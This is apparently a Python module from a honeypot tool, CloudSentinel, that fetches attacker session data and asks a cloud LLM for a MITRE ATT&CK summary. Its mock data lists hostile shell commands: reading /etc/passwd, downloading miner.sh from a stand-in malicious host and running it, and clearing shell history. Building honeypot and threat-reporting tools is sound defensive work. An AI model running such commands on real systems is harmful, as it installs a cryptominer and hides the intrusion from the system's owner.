"""
CloudSentinel AI Threat Reporter — litellm-powered post-session analysis.

Fetches session data from Redis/ClickHouse and generates structured TTP
summaries using any cloud LLM provider (Gemini Flash, GPT-4o-mini, Groq, etc.)
via litellm's unified API gateway. No local models, no GPU, no training.
"""

from __future__ import annotations

import asyncio
import json
import structlog
import os
from datetime import datetime, timezone
from typing import Any

import httpx

logger = structlog.get_logger("cloudsentinel.threat_reporter")

# litellm is imported lazily in _call_litellm() to keep the module importable
# without an LLM provider configured.


class ThreatReport:
    """Structured threat intelligence report from a honeypot session."""

    __slots__ = (
        "session_id", "attacker_ip", "country", "city", "risk_score",
        "mitre_techniques", "hassh", "commands", "summary", "primary_objective",
        "confidence", "model_used", "generated_at",
    )

    def __init__(
        self,
        session_id: str,
        attacker_ip: str,
        country: str = "Unknown",
        city: str = "Unknown",
        risk_score: int = 0,
        mitre_techniques: list[str] | None = None,
        hassh: str | None = None,
        commands: list[str] | None = None,
    ) -> None:
        self.session_id = session_id
        self.attacker_ip = attacker_ip
        self.country = country
        self.city = city
        self.risk_score = risk_score
        self.mitre_techniques = mitre_techniques or []
        self.hassh = hassh or ""
        self.commands = commands or []
        self.summary = ""
        self.primary_objective = "Unknown"
        self.confidence = 0.0
        self.model_used = "none"
        self.generated_at = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "attacker_ip": self.attacker_ip,
            "country": self.country,
            "city": self.city,
            "risk_score": self.risk_score,
            "mitre_techniques": self.mitre_techniques,
            "hassh": self.hassh,
            "commands": self.commands,
            "summary": self.summary,
            "primary_objective": self.primary_objective,
            "confidence": self.confidence,
            "model_used": self.model_used,
            "generated_at": self.generated_at,
        }


async def fetch_session_data(session_id: str, redis_url: str = "") -> dict[str, Any]:
    """Fetch session history from Redis Streams or fall back to mock."""
    if not redis_url:
        return _mock_session_data(session_id)

    try:
        import redis.asyncio as aioredis
        r = aioredis.from_url(redis_url, encoding="utf-8", decode_responses=True)
        keys = await r.keys(f"cloudsentinel:session:{session_id}:*")
        commands = await r.lrange(f"cloudsentinel:session:{session_id}:commands", 0, -1)
        ip = await r.get(f"cloudsentinel:session:{session_id}:ip") or "unknown"
        risk = await r.get(f"cloudsentinel:session:{session_id}:risk") or "0"
        techniques = await r.smembers(f"soar:session:{session_id}:techniques")
        hassh = await r.get(f"soar:session:{session_id}:hassh") or ""
        await r.aclose()

        return {
            "session_id": session_id,
            "attacker_ip": ip,
            "commands": list(commands) if commands else [],
            "risk_score": int(risk),
            "mitre_techniques": list(techniques),
            "hassh": hassh,
            "key_count": len(keys),
        }
    except Exception as exc:
        logger.debug("Redis session fetch failed: %s — using mock", exc)
        return _mock_session_data(session_id)


def _mock_session_data(session_id: str) -> dict[str, Any]:
    return {
        "session_id": session_id,
        "attacker_ip": "198.51.100.45",
        "commands": [
            "whoami", "uname -a", "cat /etc/passwd",
            "wget http://malicious.example.com/miner.sh -O /tmp/miner.sh",
            "chmod +x /tmp/miner.sh", "/tmp/miner.sh &",
            "crontab -l", "history -c",
        ],
        "risk_score": 85,
        "mitre_techniques": ["T1105", "T1059.004", "T1222", "T1033", "T1496"],
        "hassh": "8ba2faa57b1f0332fa12cc96bdf3e1be",
        "key_count": 8,
    }


def _build_analysis_prompt(report: ThreatReport) -> str:
    commands_text = "\n".join(f"  $ {cmd}" for cmd in report.commands[:50])
    techniques_text = ", ".join(report.mitre_techniques[:10]) or "none detected"

    return (
        "You are a Cyber Threat Intelligence Analyst. Analyze this attacker's "
        "terminal session captured by a honeypot sensor.\n\n"
        f"Attacker IP: {report.attacker_ip} ({report.city}, {report.country})\n"
        f"Risk Score: {report.risk_score}/100\n"
        f"MITRE ATT&CK Techniques: {techniques_text}\n"
        f"HASSH Fingerprint: {report.hassh}\n\n"
        "Executed Commands:\n"
        f"{commands_text}\n\n"
        "Provide a structured analysis in the following JSON format ONLY — "
        "no other text:\n"
        '{"summary": "<3-sentence TTP summary>", '
        '"primary_objective": "<main attacker goal>", '
        '"confidence": <0.0-1.0 float>}\n'
    )


async def _call_litellm(prompt: str) -> dict[str, Any]:
    """Generate threat analysis via litellm with automatic provider fallback."""
    try:
        from litellm import acompletion
    except ImportError:
        return {"summary": "litellm not installed", "primary_objective": "Unknown", "confidence": 0.0}

    model = os.getenv("LLM_MODEL", "gemini/gemini-2.0-flash")
    fallback_raw = os.getenv("LLM_FALLBACK_MODELS", "groq/llama-3.3-70b-versatile,openai/gpt-4o-mini")
    fallback_models = [m.strip() for m in fallback_raw.split(",") if m.strip()]

    kwargs: dict[str, Any] = {
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.3,
        "max_tokens": 512,
    }

    fallback_chain: list[dict[str, Any]] = []
    for fb in fallback_models:
        fallback_chain.append({"model": fb})
    if fallback_chain:
        kwargs["fallbacks"] = fallback_chain

    try:
        response = await acompletion(**kwargs)
        text = str(response.choices[0].message.content or "")
        return _parse_json_response(text, model)
    except Exception as exc:
        logger.warning("litellm analysis failed: %s", exc)
        return _mock_analysis()


def _parse_json_response(text: str, model: str) -> dict[str, Any]:
    """Extract JSON from LLM response, handling markdown fences."""
    # Try to find JSON block in markdown
    if "```json" in text:
        start = text.index("```json") + 7
        end = text.index("```", start) if "```" in text[start:] else len(text)
        text = text[start:end].strip()
    elif "```" in text:
        start = text.index("```") + 3
        end = text.index("```", start) if "```" in text[start:] else len(text)
        text = text[start:end].strip()

    try:
        data = json.loads(text)
        data["model_used"] = model
        return data
    except json.JSONDecodeError:
        return {
            "summary": text[:500],
            "primary_objective": "Unknown",
            "confidence": 0.5,
            "model_used": model,
        }


def _mock_analysis() -> dict[str, Any]:
    return {
        "summary": (
            "Discovery: Attacker enumerated system identity via whoami/uname. "
            "Execution: Downloaded and executed external payload miner.sh. "
            "Defense Evasion: Cleared command history with history -c."
        ),
        "primary_objective": "Resource Hijacking (Cryptocurrency Mining)",
        "confidence": 0.85,
        "model_used": "mock",
    }


async def generate_report(
    session_id: str,
    redis_url: str = "",
    attacker_ip: str = "",
    country: str = "Unknown",
    city: str = "Unknown",
    risk_score: int = 0,
    mitre_techniques: list[str] | None = None,
    hassh: str | None = None,
    commands: list[str] | None = None,
) -> ThreatReport:
    """Generate a full threat intelligence report for a session.

    If session data is available in Redis, it fetches from there.
    Otherwise, uses the parameters provided directly.
    """
    if redis_url and not attacker_ip:
        data = await fetch_session_data(session_id, redis_url)
        attacker_ip = data.get("attacker_ip", attacker_ip)
        commands = commands or data.get("commands", [])
        risk_score = risk_score or data.get("risk_score", 0)
        mitre_techniques = mitre_techniques or data.get("mitre_techniques", [])
        hassh = hassh or data.get("hassh", "")

    report = ThreatReport(
        session_id=session_id,
        attacker_ip=attacker_ip,
        country=country,
        city=city,
        risk_score=risk_score,
        mitre_techniques=mitre_techniques,
        hassh=hassh,
        commands=commands or [],
    )

    prompt = _build_analysis_prompt(report)
    analysis = await _call_litellm(prompt)

    report.summary = analysis.get("summary", "Analysis unavailable")
    report.primary_objective = analysis.get("primary_objective", "Unknown")
    report.confidence = float(analysis.get("confidence", 0.0))
    report.model_used = analysis.get("model_used", "unknown")
    report.generated_at = datetime.now(timezone.utc).isoformat()

    return report


async def generate_report_string(report: ThreatReport) -> str:
    """Format a ThreatReport as a human-readable string for webhooks."""
    techniques_str = ", ".join(report.mitre_techniques) if report.mitre_techniques else "none"
    return (
        "🛡️  CLOUDSENTINEL AI THREAT REPORT\n"
        "═══════════════════════════════════════\n"
        f"Session:    {report.session_id}\n"
        f"Attacker:   {report.attacker_ip} ({report.city}, {report.country})\n"
        f"Risk:       {report.risk_score}/100\n"
        f"Objective:  {report.primary_objective}\n"
        f"Confidence: {report.confidence:.0%}\n"
        f"Model:      {report.model_used}\n"
        f"Techniques: {techniques_str}\n"
        f"HASSH:      {report.hassh or 'N/A'}\n"
        f"Generated:  {report.generated_at}\n"
        "───────────────────────────────────────\n"
        f"{report.summary}\n"
        "═══════════════════════════════════════\n"
    )


# ── CLI entrypoint ────────────────────────────────────────────────────

async def main() -> None:
    """Standalone threat reporter demo."""
    session_id = "session_demo_001"
    print(f"[*] Generating threat report for {session_id}...")
    report = await generate_report(session_id)
    print(await generate_report_string(report))

    # Also output as structured JSON for pipeline consumption
    print("[*] Structured report (JSON):")
    print(json.dumps(report.to_dict(), indent=2))


if __name__ == "__main__":
    asyncio.run(main())
